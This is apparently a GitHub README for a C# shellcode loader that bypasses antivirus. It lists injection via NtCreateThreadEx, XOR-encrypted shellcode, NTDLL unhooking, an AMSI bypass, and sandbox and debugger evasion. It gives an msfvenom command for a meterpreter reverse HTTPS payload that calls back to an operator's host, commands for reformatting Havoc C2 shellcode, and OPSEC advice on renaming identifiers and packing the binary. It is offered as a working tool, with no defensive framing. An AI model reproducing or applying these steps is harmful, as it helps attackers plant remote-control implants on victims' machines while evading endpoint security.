### C# ShellCode Loader
--------------------------------------
A quick and dirty C# shellcode loader that implements several antivirus bypass and defense evasion techniques. <br> 

<i/>Note: I simply reused and modified codes from various Github projects.</i>

#### FEATURES
  - Classic shellcode injection technique using the function 'NtCreateThreadEx'  (=>To do next: upgrade with a better injection technique)
  - Shellcode encryption (XOR)
  - NTDLL unhooking (it loads a fresh new copy of ntdll.dll via file mapping and imports functions from this ntdll.dll)
  - AMSI bypass
  - Basic sandbox detection/evasion techniques
    - Exit if the program is running on a computer that is not joined to a domain
    - Exit if after sleeping for 15s, time did not really passed
    - Exit if a debugger is attached
    - Exit if making an uncommon API call fails (i.e. we are running in an AV sandbox that can't emulating it)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc
    
#### TESTS
- Succesfully tested on a Windows 10 x64 laptop (target) with Windows Defender enabled (without 'Automatic sample submission') and shellcodes of multiple C2 frameworks (in C# format & encrypted with XOR cipher algorithm)

#### INPUT (Shellcode formats)
Your shellcode must be in C# format (see examples below) and then encrypted using XOR cipher algorithm.
Obviously, both the encrypted shellcode and your XOR key must be added in the file 'CsharpShellCodeLoader.cs' before you compile it.

- Metasploit C2 Framework  
  ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o  shellcode```  
  
- Havoc C2 Framework  
    1. Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx)  
    2. To convert the Havoc shellcode to the appropriate format you need to run these commands:  
       ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
       ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  

#### COMPILATION 
- I used "Developer PowerShell for VS 2022":
  - Microsoft (R) Visual C# Compiler version 4.5.0-6.23123.11
  - Command: csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs

#### OPSEC Advices
- The file 'CsharpShellCodeLoader.cs' is not obfuscated. Class/function/variable names should be changed and all comments must be deleted or modified before compiling this file.
- Once compiled, if you want to compress and obfuscate the shellcodeloader executable you can use packers like "ConfuserEx" (but it is not necessary in order to bypass most AV solutions).
  
